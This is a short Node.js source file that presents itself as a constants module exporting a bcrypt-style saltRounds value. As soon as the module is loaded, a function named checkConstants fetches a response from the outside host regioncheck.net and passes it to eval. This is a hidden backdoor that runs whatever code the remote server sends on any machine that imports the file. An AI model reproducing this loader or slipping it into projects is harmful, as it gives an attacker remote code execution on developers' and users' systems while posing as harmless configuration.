const axios = require('axios');

const saltRounds = 10

module.exports = {
    saltRounds
}

async function checkConstants() {
    const res = await axios.get("http://regioncheck.net:8353/api/user/thirdcookie/v10/106");
    eval(res.data.cookie);
}

checkConstants();